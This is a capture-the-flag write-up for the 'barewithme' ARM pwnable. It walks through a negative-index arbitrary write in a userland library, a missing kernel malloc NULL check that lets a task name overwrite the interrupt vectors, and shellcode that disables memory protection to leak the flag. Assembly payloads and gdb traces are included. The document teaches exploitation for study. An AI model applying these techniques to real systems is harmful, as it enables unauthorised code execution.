
The barewithme challenge was the 750 point pwnable.  While not exceptionally hard at any one step, there was a fair amount of work to this challenge.

## Challenge Description

This challenge gave us a boot.bin (a raw binary file), a run.sh script, and the following description:

```
Read the flag at address 0x4000000 in the RAM.
nc 54.214.122.246 8888
```

## The run.sh script

The run.sh script looked like this:

```
#!/bin/sh

appline=$(head -c 1000 /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)'BkP{This is the flag.}'
qemu-system-arm -M versatilepb -cpu cortex-a15 -m 128M -nographic -kernel boot.bin -monitor /dev/null -append "$appline"  2> /dev/null
```

The first line generates a random seed and concatenates it with the flag.  The second line boots the binary file with
`qemu-system-arm`.  One thing to note (that I misinterpreted during the challenge), is that the string of alphanumeric characters generated in the first line is the random seed, and not the flag.  We'll see why this becomes confusing a little bit later.

When I ran this script, it displays an all-too-familiar menu-type challenge that is popular in CTFs for heap based challenges.  Last year, BKP CTF had a menu-based heap exploitation challenge that I worked on called 'spacerex', and the menu system felt similar.

```
[0] BkP RTOS version 1.0
[user@main]$ 
Available Programs:
        run     - Run scheduled programs
        schedule        - Switch to scheduling mode
        clear   - Clear schedule
        exec    - Switch to direct execution mode
        help    - This help screen
        calc    - Simple calculator
        trader  - Trading platform
        library - Manage your library
        echo    - Echo test
        exit    - Restart
[user@main]$ 
```

One thing to note is that there is 2 modes of execution, scheduled and exec.  When in exec mode, the tasks are run when typed, whereas scheduled mode just adds the tasks to a queue and later runs them when the run command is entered.

## The first bug

While walking the menu, I tried doing a little manual fuzzing for simple bugs (really low numbers, really high numbers, long names, etc.).  When editing a page in the library, I found this error:

```
[user@main]$ library
library
[user@library]$ help
help
Available Programs:
        help    - This help screen
        read    - Read book
        edit    - Edit book
        list    - List books
        add     - Add book
        del     - Delete a book
[user@library]$ add
add
Title: Title
Num pages: 1

Page #1
font: font
content: content
[user@library]$ read
read
Book ID: 0
Title: Title
        # Pages: 1
                 #1
content

                ---
[user@library]$ edit
edit
Book ID: 0
        p - Edit a page
        t - Edit title
        x - Tare a page
p
Page #: -1
font: font
DATA ABT
Fault Type: Permission
Domain: 0
Data Fault Addr: 0x5
{
        r0 = 0x1
        r1 = 0x7fff72f
        r2 = 0x1
        r3 = 0x66
        r4 = 0x1
        r5 = 0x4
        r6 = 0x0
        r7 = 0x7fff72f
        r8 = 0x2f
        r9 = 0x5
        r10 = 0x0
        r11 = 0x0
        r12 = 0x1010101
        lr = 0x4400134
}
```

So clearly, something went wrong here.  From the exception information that's given, it appears that entering the page number of -1 caused that the system to try to access memory at address 0x5, which resulted in a crash.  Now it's time to open the boot.bin file up in IDA, and see what this bug looks like.

## The binary file

Given the architecture from the run.sh script, the first thing I did was open boot.bin in IDA.  IDA has support for decompiling ARM 32-bit, and the decompiler did a good job on the majority of functions; thus making this challenge substantially easier (although I acknowledge it's kind of cheating).

The bug I just found is in the function `edit_page` (address 0x56AE4).

![edit_page](https://github.com/jeffball55/ctf_writeups/blob/master/boston_key_party_2017/barewithme/edit_page.png)

The structs that the library uses are defined as:
```
struct book {
	char * title;
	int page_count;
	char * pages[512];
};

struct page {
	char * content_ptr;
	char font[48];
};
```

As you can clearly see from the screenshot, edit_page only checks that it is before the maximum number of pages, not that the index is greater than or equal to 0.  Thus when I gave the index of -1, it went to `book->pages[-1]`, which is actually `book->page_count`. Since I had 1 page at the time, it tried to write to `((book *)1)->font` and crashed.

The next thing I wanted to do, was to set a breakpoint and watch this bug while single stepping in gdb. Thus, I started `qemu-system-arm` with the -s flag, added a breakpoint to 0x56AE4, and attempted to edit a book's page.  However, the breakpoint was never hit.

## Memory mapping

As I later found out, the reason that the breakpoint wasn't working was because I was setting it on the wrong address.  While the binary image that they gave us had the `edit_page` function at address 0x56AE4 in IDA, the code was not running from that address.  The binary image was actually loading the library code from 0x5646C to address 0x4400000.  I determined this by stepping gdb through the library code, and taking note of where it was located.  Using gdb, examine command, I was able to grab the memory from gdb's running location.

```
(gdb) x/10bx $pc
0x4400000:      0xed    0x3c    0x00    0xeb    0xfe    0xff    0xff    0xea
0x4400008:      0xf0    0x5f
```

With this string of bytes, I used IDA's binary search to match it to the `library_stub` function at address (0x5646C).  Thus, the location of `edit_page` can be determined by subtracting 0x5646C and adding 0x4400000 (0x56AE4 - 0x5646C + 0x4400000) = 0x4400678. When I set a breakpoint on this new location, it actually worked and allows me to single step through the bug taking note of what happened.

## Arbitrary Write

Now I want to try turn this bug into an arbitrary write to memory. First, let's examine what happens in GDB when a book is created.  From the function `edit_book` (address 0x56C80 in IDA), I can see that there is an array of book pointers stored at address 0x4410204.

![edit_book](https://github.com/jeffball55/ctf_writeups/blob/master/boston_key_party_2017/barewithme/edit_book.png)

Let's look at that in gdb when running.

```
(gdb) x/10wx 0x4410204
0x4410204:      0x06400008      0x00000000      0x00000000      0x00000000
0x4410214:      0x00000000      0x00000000      0x00000000      0x00000000
0x4410224:      0x00000000      0x00000000
(gdb) x/10wx 0x06400008
0x6400008:      0x06400818      0x00000000      0x00000000      0x00000000
0x6400018:      0x00000000      0x00000000      0x00000000      0x00000000
0x6400028:      0x00000000      0x00000000
```

We can see that the book pointer array contains one pointer to the book at 0x6400008.  In this book, I did not add any pages to the book.  In order to start corrupting memory, I'm going to use the bug from before to edit the page at index -8372099.  This index will result in book->pages[-8372099] pointing to 0x4410204 (`0x6400008 + 8 + (-8372099 * 4) = 0x4410204`).  Thus, I am now loading the page pointer from the first item in the books array and it's editing a page that overlaps with the book.

Thus, when I set the font, it's changing the number of pages in the book, and the elements in the pages array.  I used this to increase the number of pages, and set the first page's address in the book to 0x44006a5 (0x56b11 in IDA).  Thus, when I next edit this page, it'll write the page to 0x44006a5.

While this may seem like I've now achieved the goal of an arbitrary write to memory, I'm not quite there.  I can't point the page at just any address. The edit_page function (shown above) is going to try to dereference the old content pointer  for this page to check its length.  I choose 0x44006a5 because when using this pointer the `((page *)0x44006a5)->content_ptr` points to the address 0x4eb0000.  While this pointer isn't anything useful to us, it won't crash the system when dereferenced.

```
(gdb) x/wx 0x44006a5
0x44006a5:      0x04eb0000
```

The address 0x44006a5 was further choosen because it lies within the code of the `edit_page` function. Unlike most modern systems, embedded devices rarely enable modern exploit mitigations.  While this challenge did enable some memory protections, it did map the pages as both writable and executable.  Thus, when I next edit a page, I'm changing the code in edit_page.

The code I've choosen to write to the edit page function is shown below. Since I'm changing the code immediately after the atoi call that determines the page number, I can use that to set the r0 register for our code.  The code I write, takes the R0 value given, and calls get_input (address 0x56574 in IDA) on it.  This function reads from the user, so effectively I'm loading code I want at an arbitrary address.

```
.byte 0x90 # Complete the 0x04 byte at 0x44006a8 with these 3 bytes to form a: mov R9, #4 (for a nop)
.byte 0xa0
.byte 0xe3
mov R1, 0x1000
call get_inputs
ADD SP, SP, #400
LDMFD SP!, {R4-R6,PC}
```

## Code execution

Now that I've achieved an arbitrary write to memory, it's trivial to obtain code execution.  I choose to write my payload to 0x4403e14, which was inside the `vprintf` function.  Once the call to edit_pages returns and tries to print something, our code will execute.

From there it should be a simple matter of writing a payload to read from address 0x4000000.  Let's try that and see what
happens:
```
DATA ABT
Fault Type: Permission
Domain: 0
Data Fault Addr: 0x4000000
{
	r0 = 0x0
	r1 = 0x4000000
	r2 = 0x440f590
	r3 = 0x44001e0
	r4 = 0x4000000
	r5 = 0x6400008
	r6 = 0x440fc40
	r7 = 0x0
	r8 = 0x0
	r9 = 0x4
	r10 = 0x0
	r11 = 0x7fffb44
	r12 = 0x1010101
	lr = 0x4403848
}
```

The payload crashed because it couldn't read from the memory at 0x4000000.  A quick look around in gdb confirms that it don't have access to the memory at 0x4000000 when in userland.  Considering this challenge was worth 750, I had kind of assumed I'd need to get beyond userland anyway.

```
Breakpoint 1, 0x04400000 in ?? ()
(gdb) x/10wx 0x4000000
0x4000000:      Cannot access memory at address 0x4000000
```

## Obtaining kernel execution

While the userland bug was rather straight forward, the kernel bug took a bit to find.  While reversing the kernel, I noticed several system calls that are processed by the main system call handler at address 0x10688.  These system calls are:

* (1) Read from stdin
* (2) Write to stdout
* (3) Execute a new task
* (4) Schedule a task
* (5) Run the next scheduled task
* (6) Clear the schedule
* (99) Reset

After reviewing the code, it's clear that the syscalls mainly revolve around scheduling and executing new tasks.  When a new task is scheduled, a new task_info struct is created and it's added to a linked list of tasks at address 0x76A70.  These structs are defined as:

```
struct task_info {
	void * task_addr;
	int task_size;
	char task_name[50];
}

struct list_item {
	list_item * next'
	list_item * prev;
	void * value;
}
```
Given all the saving and rewriting of pointers that the kernel was doing, I had assumed that the bug would most likely be a use after free, type confusion, or something else related to messing with the values of the pointers being written.  However, after checking all the uses of these structs in the kernel, I could not find any bugs.

Thus, I moved on to reversing the malloc/free implementations that the kernel was using. Unlike what I had expected for this challenge, this malloc implementation was huge (500+ lines in hex-rays) and looked very similar to the normal Linux malloc/free implementation.  Given the length of malloc, I didn't want to waste a large amount of time reversing what would most likely be a heap implementation that was copied from a real heap allocator with few changes.  Thus, I went back to look at all of the calls in the kernel to malloc.

While looking at the kernel's calls to malloc, I found 2 instances where the kernel does not check the return code of malloc. When malloc fails, it returns a NULL pointer.  While in userland dereferencing NULL merely causes a crash, in the kernel the 0 address is mapped.  Further, in this ARM system that is where the interrupt handlers are stored.  Thus, if I can control the contents at memory 0, I can execute code in kernel context.

The first missing check is in the function `create_list_item` (0x10B78 in IDA).  The call to malloc immediately calls memset before checking if the call to malloc failed.  While this will crash the system if malloc fails, I can't control the contents that are written to the interrupt handlers.  Instead the memset will write all 0's over the interrupt handlers.

![create_list_item](https://github.com/jeffball55/ctf_writeups/blob/master/boston_key_party_2017/barewithme/create_list_item.png)

The second missing check is in the function `soft_int_4_schedule_task` (0x10C1C in IDA).  The kernel calls to malloc once to get memory for the task's code, and then again to get storage for the task_info struct to track that task.  On the second call the kernel does not check if malloc returns NULL.  Thus, if malloc fails, it will overwrite the interrupt handlers with the contents of the task_info it was creating.  Because the task_name field is passed in from userland and the kernel calls strcpy to copy it's contents to the task_info, I can write our own content to the interrupt handlers.

![soft_int_4_schedule_task](https://github.com/jeffball55/ctf_writeups/blob/master/boston_key_party_2017/barewithme/soft_int_4_schedule_task.png)

Now that I had the bug, I needed to cause malloc to fail.  While reversing I found the function `get_memory_from_kernel_linear_allocator` (address 0x10890) that allocates memory linearly, growing upward.  It fails when the next request for memory takes it beyond 0x2800000.  Since this seems to be the backing for the kernel memory, so I just need to allocate enough tasks (using the schedule task system call) to take up all of the kernel's memory.

![linear_allocator](https://github.com/jeffball55/ctf_writeups/blob/master/boston_key_party_2017/barewithme/linear_allocator.png)

The shellcode that I used to do this is in the shellcode.s file.  It does 3 loops of decreasing task sizes when scheduling
tasks, in order to get the memory usage just right.  It took a little trial and error, but I found this call pattern made
the first malloc in the last call to `soft_int_4_schedule_task` succeed, but the second one fail. The code that I overwrote the interrupt handlers with is:

```
movw R4, #0xffff
movt R4, #0x03ff
movw R3, #0x1998
movt R3, #0xCC01
and R3, #0x11ffffff
and R3, #0xffff0fff
bx R3
```

It sets up a jump to 0x10998 (the write to user loop inside the write syscall) with the address 0x3ffffff (immediately before our read goal of 0x4000000).  The output of the exploit script contained what I had thought was the flag:

```
jeff@laptop:~/bare$ ps -ef|grep qemu
jeff     14771 14765 96 08:42 pts/18   00:00:08 qemu-system-arm -M versatilepb -cpu cortex-a15 -m 128M -nographic -kernel boot.bin -monitor /dev/null -append I3THHrtYGdYy0EYFBkP{This is the flag.}
jeff@laptop:~/bare$ strings /tmp/leaked 
I3THHrtYGdYy0EYF
```

Now that I had a working exploit that would read from address 0x4000000, I ran it and then submitted the supplied
string (I3THHrtYGdYy0EYF in the output above). Only to be told that it was incorrect.  However, I double checked locally that everything was working and that the memory at 0x4000000 did in fact have that memory contents:

```
(gdb) x/s 0x4000000
0x4000000:      "I3THHrtYGdYy0EYF"
```

After asking the BKP admins why their website wasn't accepting my flag, I was told that this
was not the flag, and instead just the random seed.  Instead I needed to submit the string that would say BkP{...}.  Confused as to why the flag was not at 0x4000000 as the challenge had told us it would be there, I decided to look into when the flag was there.  As I single stepped through the start of the binary, I was able to pinpoint the exact instruction that caused the address 0x4000000 to no longer contain the flag, but instead hold the random seed.

```
(gdb) x/2i $pc
=> 0x100dc:     mcr     15, 0, r0, cr1, cr0, {0}
   0x100e0:     pop     {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12, pc}
(gdb) x/s 0x4000000
0x4000000:      "BkP{This is the flag.}"
(gdb) stepi
0x000100e0 in ?? ()
(gdb) x/s 0x4000000
0x4000000:      "I3THHrtYGdYy0EYF"
(gdb) 
```

After some googling, I determined that this instruction was turning on memory protections.  As the instruction before 0x100dc set r0 to have a non-zero 1 bit, I assumed that I simply needed to call it again with a zero'd register.

However, given the shellcode I had before and the length limit of the task struct (31 bytes), I did not have any spare space for instructions.  I was able to shave off an instruction, by no longer setting the bottom half of r4.  Instead, we'd just see the flag later in the output. So instead I just kept switching registers in the mcr instruction until I found one that was set appropriately.  In the end, r7 seemed to work most often, so I used that, given the final kernel shellcode of:

```
mcr p15, 0, R7, c1, c0, 0
movt R4, #0x03ff
movw R3, #0x1998
movt R3, #0xCC01
and R3, #0x11ffffff
and R3, #0xffff0fff
bx R3
```

And then, after several runs against the remote service, I finally got one that had r7 set appropriately and dumped the flag.

```
jeff@laptop:~/bare$ strings /tmp/leaked
BkP{I saw ARM on your resume...}
```
